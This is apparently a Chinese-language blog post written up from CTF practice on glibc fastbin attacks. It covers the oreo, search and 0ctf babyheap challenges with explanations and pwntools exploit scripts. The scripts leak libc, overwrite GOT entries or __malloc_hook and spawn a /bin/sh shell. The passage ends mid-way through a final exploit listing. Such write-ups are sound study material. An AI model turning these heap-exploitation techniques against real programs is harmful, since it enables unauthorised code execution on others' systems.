<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    fastbinin_attack |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-fastbinin-attack" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      fastbinin_attack
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/02/07/fastbinin-attack/" class="article-date">
  <time datetime="2020-02-07T13:59:05.000Z" itemprop="datePublished">2020-02-07</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒<br>好了，废话不多说，开始吧</p>
<a id="more"></a>

<h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>add<br><img src="/2020/02/07/fastbinin-attack/1.png" alt><br>里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52   description占25，name则占27<br>具体看汇编<br><img src="/2020/02/07/fastbinin-attack/2.png" alt><br>v1是pre指针     为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。<br>我们可以写入的name有为56，存在溢出，可以覆写pre的地址</p>
<p>show<br><img src="/2020/02/07/fastbinin-attack/3.png" alt><br>这里show的内容description是指针指向的地址<br>我们可以借此leak出libc</p>
<p>massage<br><img src="/2020/02/07/fastbinin-attack/4.png" alt><br>进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell</p>
<p>order<br><img src="/2020/02/07/fastbinin-attack/5.png" alt><br>这里就是free，free完之后a2a0+1</p>
<p>1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr<br>2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去<br>3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp）</p>
<p>关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）<br>这样就相当于往0x0804a250指向的地址写入system。<br>这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);<br>分号代表system函数将这个参数分成两部分，先后执行里面的命令。<br>因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，<br>就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);<br>这样就能实现最终目的了。</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">import sys</span><br><span class="line"># context.binary = &quot;./melong&quot;</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./oreo&apos;)</span><br><span class="line">elf = ELF(&apos;./oreo&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(name,description):</span><br><span class="line">	# p.recvuntil(&quot;6. Exit!&quot;)</span><br><span class="line">	# p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	p.sendline(&quot;1&quot;)</span><br><span class="line">	# p.recvuntil(&quot;Rifle name: &quot;)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	# p.recvuntil(&quot;Rifle description: &quot;)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	# p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	p.sendline(&quot;2&quot;)</span><br><span class="line">	p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line">	# p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def massage(notice):</span><br><span class="line">	# p.recvuntil(&quot;Action: &quot;)</span><br><span class="line">	p.sendline(&quot;4&quot;)</span><br><span class="line">	p.sendline(notice)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">add(name ,25 * &apos;a&apos;)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line"># libc_base = libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。</span><br><span class="line">i=1</span><br><span class="line">for i in range(0x3f): </span><br><span class="line">	add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;)  #num -&gt; 0x41</span><br><span class="line"></span><br><span class="line">#num addr = 0x804A2A4</span><br><span class="line"></span><br><span class="line">#fack chunk</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)</span><br><span class="line">massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunk</span><br><span class="line"></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]</span><br><span class="line">add(&apos;a&apos;,p32(scanf_got))</span><br><span class="line"></span><br><span class="line">massage(p32(system_addr))</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="2015-search"><a href="#2015-search" class="headerlink" title="2015 search"></a>2015 search</h2><p>这题就没有很认真的写wp，就把不太明白的点记一下吧</p>
<p>一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free<br>分析两个一开始没懂的点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;)  #a</span><br><span class="line">index_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;)  #b</span><br><span class="line">index_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;)  #c</span><br><span class="line"> </span><br><span class="line"> # a-&gt;b-&gt;c-&gt;NULL</span><br><span class="line"> search_word(&apos;d&apos;)   #正常的删除 </span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> </span><br><span class="line"> # b-&gt;a-&gt;b-&gt;a-&gt;...      </span><br><span class="line"> search_word(&apos;\x00&apos;)    #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除b</span><br><span class="line"> p.sendline(&apos;y&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除a</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br><span class="line"> p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;)    #删除  libc_leak的时候添加的sentence</span><br><span class="line"> p.sendline(&apos;n&apos;)</span><br></pre></td></tr></table></figure>


<p> 最后是只删除了b使得  a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> #此时的fastbin为 b-&gt;a-&gt;b</span><br><span class="line"># 3. fastbin attack to malloc_hook nearby chunk    向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近</span><br><span class="line">fake_chunk_addr = main_arena_addr - 0x33</span><br><span class="line">fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(fake_chunk)  #b的fd改成fake_addrs</span><br><span class="line"> index_sentence(&apos;a&apos; * 0x60)   #分配chunk_a</span><br><span class="line"> index_sentence(&apos;b&apos; * 0x60)  #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload</span><br><span class="line"> </span><br><span class="line"> one_gadget_addr = libc_base + 0xf02a4</span><br><span class="line"> payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr)  </span><br><span class="line"> payload = payload.ljust(0x60, &apos;f&apos;)</span><br><span class="line"> </span><br><span class="line"> index_sentence(payload)    #赋写malloc_hook为one_gadget</span><br></pre></td></tr></table></figure>




<h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p> 先介绍一下Arbitrary Alloc<br>（来自ctf wiki）</p>
<p>只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p>
<p>example<br>在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=malloc(0x60);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1=0x7ffff7dd1af5-0x8;</span><br><span class="line">    malloc(0x60);</span><br><span class="line">    chunk_a=malloc(0x60);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</span><br></pre></td></tr></table></figure>

<p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure>

<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br></pre></td></tr></table></figure>

<p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##define fastbin_index(sz)                                                      \</span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>

<p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）<br>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 <strong>malloc_hook 的内容 (在我的 libc 中</strong>realloc_hook 与__malloc_hook 是在连在一起的)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line"> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line"> $rax   : 0x7ffff7dd1afd</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。<br>一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐)</p>
<p>okk,开始进入正题<br>在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap</p>
<p>第一步先 用overlap leak基址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80) #5 如果没有这个，free就没了，打不出来地址</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬</span><br></pre></td></tr></table></figure>

<p>第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，<br>0x80可以写下0x60的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure>

<p>idx为5，则找7f，就开始提到的arbitrary alloc的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br></pre></td></tr></table></figure>

<p>完整的exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 